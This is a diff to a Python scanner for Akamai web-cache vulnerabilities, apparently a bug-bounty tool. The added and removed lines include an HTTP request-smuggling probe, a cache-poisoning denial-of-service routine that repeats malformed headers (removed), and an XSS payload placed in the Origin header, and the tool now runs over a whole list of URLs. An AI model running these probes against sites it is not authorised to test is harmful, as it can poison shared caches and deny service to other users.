@@ -3,6 +3,7 @@
 
 from modules.utils import *
 
+
 def akamai(url, s):
     """
        https://techdocs.akamai.com/edge-diagnostics/docs/pragma-headers
@@ -11,6 +12,7 @@ def akamai(url, s):
     """
     pragma_list = {
     "akamai-x-cache-on": "X-Cache",
+    "akamai-x-get-cache-key, akamai-x-get-true-cache-key": "X-Cache",
     "akamai-x-cache-remote-on": "X-Cache-Remote",
     "akamai-x-check-cacheable": "X-Check-Cacheable",
     "akamai-x-get-true-cache-key": "X-True-Cache-Key", 
@@ -36,12 +38,15 @@ def akamai(url, s):
                 print(f"   └── {res}: {req.headers[res]}")
         except:
             pass
-    cpdos_akamai(url, s)
+    req_smuggling(url, s)
+    xss_akamai(url, s)
     
 
 def req_smuggling(url, s):
     #https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b
     #https://blog.hacktivesecurity.com/index.php/2022/09/17/http/
+    url = f"{url}?cb={random.randrange(999)}"
+
     headers = {
         "Connection": "Content-Length",
         }
@@ -58,34 +63,38 @@ def req_smuggling(url, s):
     response = s.get(url, headers=headers, data=body, verify=False, timeout=10)
 
     if response.status_code > 500 and response.status_code != res_main.status_code:
-        print(f'  \033[31m └── VULNERABILITY CONFIRMED\033[0m | {url} [{res_main.status_code} > {response.status_code}]\n     └── H {headers}\n     └── B {body}')
+        print(f'  \033[33m └── [INTERESTING BEHAVIOR]\033[0m | {url} [{res_main.status_code} > {response.status_code}]\n     └── H {headers}\n     └── B {body}')
 
 
-def cpdos_akamai(url, s):
-    headers = [{'"': "1"}, {"\\":"1"}]
-    url = f"{url}?aka_loop{random.randint(1, 100)}={random.randint(1, 100)}"
-    al_response = False
-    for h in headers:
-        try:
-            aka_loop = s.get(url, headers=h, verify=False, timeout=10)
-            if aka_loop.status_code == 400:
-                for al in aka_loop.headers:
-                    if "no-cache" not in [aka_loop.headers[r] for r in aka_loop.headers]:
-                        if "HIT" in aka_loop.headers[al]:
-                            print(f"\033[33m └── INTERESTING BEHAVIOR\033[0m | Akamai Redirect Loop | \033[34m{url}\033[0m | PAYLOAD: {header}")
-                            al_response = True
-            if al_response:
-                for x in range(10):
-                    requests.get(url, headers=h, verify=False, timeout=10)
-                aka_verif = requests.get(url, verify=False, timeout=10)
-                if aka_verif.status_code == 400:
-                    print(f"  \033[31m └── VULNERABILITY CONFIRMED\033[0m | Akamai Redirect Loop | \033[34m{url}\033[0m | PAYLOAD: {h}")
-                    vuln_found_notify(url, h)
-        except:
-            print(f" └── Error with this payload please check manually with this header: {h}")
+def xss_akamai(url, s):
+    url = f"{url}?cb={random.randrange(999)}"
+
+    headers = {
+    "Origin": "'-alert(1)-'"
+    }
+    
+    try:
+        response = s.get(url, headers=headers, verify=False, timeout=10)
+        for h in response.headers:
+            if "x-true-cache-key" in h.lower() and "origin" in response.headers[h.lower()]:
+                print(f'  \033[33m └── [INTERESTING BEHAVIOR]\033[0m | {url} \n   └── H {headers}\n  ')
+    except Exception as e:
+        print(f"Error : {e}")
+        pass
 
 
 if __name__ == '__main__':
-    url = sys.argv[1]
+    url_file = sys.argv[1]
     s = requests.Session()
-    akamai(url, s)
+    #akamai(url_file, s)
+    with open(url_file, "r") as urls:
+        urls = urls.read().splitlines()
+        for url in urls:
+            try:
+                akamai(url, s)
+            except KeyboardInterrupt:
+                print("Exiting")
+                sys.exit()
+            except:
+                pass
+            print(f" {url}", end='\r')
